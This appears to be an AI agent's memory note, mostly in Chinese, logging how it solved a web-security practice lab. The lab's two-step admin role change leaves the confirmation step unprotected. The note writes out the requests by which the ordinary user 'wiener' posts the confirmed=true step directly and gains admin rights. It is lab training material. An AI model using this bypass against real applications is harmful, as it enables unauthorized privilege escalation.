---
metadata:
  node_type: memory
name: "PRS arm A multi-step process no access control"
description: "arm A 基线:lab-multi-step-process-with-no-access-control-on-one-step 冷实例一次通过 - 步骤1 401/步骤2(confirmed=true)匿名直调提权"
last_updated: 2026-10-08T18:33:23+08:00
created: 2026-10-08T18:33:23+08:00
---

# 终态: solved(一次通过,fresh instance reused:false)

## 链路
1. page_read lab 页 → lab_id 48EA5EFF...BA9D2C(sha256)
2. range_launch launch <sha256> --jar /tmp/cj1.json → https://0abb000403dc4577809a76cc001c002d.web-security-academy.net/ reused:false
3. http_session get /login (无 CSRF 字段) → post /login username=wiener&password=peter → 302 /my-account?id=wiener(会话建立)
4. http_session get /admin as wiener → 401 "Admin interface only available if logged in as an administrator"
5. 结构侦察(非题解):另开 jar /tmp/cjadmin.json 登录 administrator:admin → get /admin 200,读到角色表单 action=/admin-roles POST,字段 username(+action=upgrade|downgrade)
6. administrator 提交 step1(/admin-roles username=wiener&action=upgrade)不 follow → 响应体是确认页:form action=/admin-roles POST + hidden action=upgrade/confirmed=true/username=wiener
7. 对照:wiener 提交 step1 → 401 JSON("Unauthorized")
8. 利用:wiener 直接提交 step2 /admin-roles username=wiener&action=upgrade&confirmed=true → 302 Location:/admin(无鉴权)
9. 验证:wiener get /admin → 200,选择项 wiener (ADMIN);banner_verdict → solved:true + congrats line

## 判据
- 步骤1(无 confirmed)有鉴权:401
- 步骤2(confirmed=true)无鉴权:非管理员可直调并完成升级
- 最终 banner class is-solved + "Congratulations, you solved the lab!"

## 要点
- 该 lab 无 --follow 也能拿到 step1 确认页(200 直接返回确认表单,不重定向)
- 侦察 step1 不落状态(两步流程,确认步才改角色),可安全用 administrator 读确认表单结构
- 件足矣:page_read / range_launch / http_session / banner_verdict;无需新件
- 未读题解、未读相关 records、一切 HTTP 走件、未 git 提交

